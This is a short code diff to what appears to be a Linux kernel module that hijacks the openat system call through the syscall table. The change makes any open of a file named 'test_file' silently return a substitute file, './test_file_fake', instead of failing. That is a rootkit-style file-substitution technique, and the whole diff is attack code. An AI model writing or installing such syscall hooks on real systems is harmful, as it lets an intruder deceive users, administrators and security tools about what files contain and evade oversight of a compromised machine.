@@ -69,11 +69,12 @@ asmlinkage int sys_openat_hijack(int dirfd, const char __user *pathname, int fla
     int (*orig)(int, const char __user *, int) = 
         (int (*)(int, const char __user *, int))(sys_call_table[__NR_openat]);
 
-    const char * hidden_file = "test_file";
+    const char * orig_file = "test_file";
+    const char * fake_file = "./test_file_fake";
 
-    if (strstr(pathname, hidden_file))
+    if (strstr(pathname, orig_file))
     {
-        return -1;
+        return (*orig)(dirfd, fake_file, flags);
     }    
  
     return (*orig)(dirfd, pathname, flags);
